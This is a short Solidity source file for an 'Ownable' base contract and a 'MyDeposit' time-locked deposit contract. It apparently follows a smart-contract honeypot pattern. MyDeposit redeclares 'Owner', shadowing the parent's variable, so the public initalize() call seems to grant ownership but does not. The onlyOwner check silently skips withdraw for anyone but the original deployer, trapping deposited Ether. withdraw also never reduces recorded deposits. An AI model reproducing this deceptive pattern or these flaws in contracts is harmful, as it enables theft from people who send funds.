1 /*
2    Copyright (C) 2018  The Halo Platform
3    https://www.haloplatform.tech/
4    Scott Morrison
5 
6    This is free software and you are welcome to redistribute it under certain
7    conditions. ABSOLUTELY NO WARRANTY; for details visit:
8    https://www.gnu.org/licenses/gpl-2.0.html
9 */
10 pragma solidity ^0.4.24;
11 
12 contract Ownable {
13     address public Owner;
14     constructor() public { Owner = msg.sender; }
15     modifier onlyOwner() { if (Owner == msg.sender) { _; } }
16     
17     function transferOwner(address _Owner) public onlyOwner {
18         if (_Owner != address(0))
19             Owner = _Owner;
20     }
21 }
22 
23 contract MyDeposit is Ownable {
24     address public Owner;
25     mapping (address => uint) public deposits;
26     uint public openDate;
27     
28     function initalize(uint _openDate) payable public {
29         Owner = msg.sender;
30         openDate = _openDate;
31         deposit();
32     }
33     
34     function() public payable {  }
35     
36     function deposit() public payable {
37         if (msg.value >= 0.5 ether)
38             deposits[msg.sender] += msg.value;
39     }
40 
41     function withdraw(uint amount) public onlyOwner {
42         if (now >= openDate) {
43             uint max = deposits[msg.sender];
44             if (amount <= max && max > 0)
45                 if (!msg.sender.send(amount))
46                     revert();
47         }
48     }
49     
50     function kill() public {
51         if (address(this).balance == 0)
52             selfdestruct(msg.sender);
53     }
54 }